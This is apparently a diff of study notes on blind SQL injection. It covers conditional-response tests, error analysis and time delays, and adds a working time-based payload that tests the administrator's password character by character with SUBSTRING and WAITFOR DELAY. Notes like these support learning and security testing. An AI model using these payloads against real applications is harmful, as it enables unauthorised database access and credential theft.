@@ -4,7 +4,6 @@ database errors.
 Types of Blind SQL Injection?
 1: HTTP response do not contain the result of query.
 2: Error-based SQL injection
-3:
 
 => How do I check Blind SQL injection? 
 
@@ -12,7 +11,17 @@ Method 1: By triggering conditional responses
 example: xyz' AND 1=1--
 example" xyz' AND 1=2--
 
-Method 2:
+Method 2: Analysis the error 
+example: "Error: invalid input syntax for type integer: 'example data'"
+
+Method 3: Triggerin time delays
+
+----------------------------------------------------------------------------
+
+Injection query=>'; IF (SELECT COUNT(username) FROM users where username='administrator' AND SUBSTRING(password,1,1)>'m')=1 WAITFOR DELAY '0:0:10'--
+
+----------Above command will delays the response to 10 seconds.-------------
+
 
 Analysis:
 1) Prove that parameter is vulnerable by adding ' or '' quotation
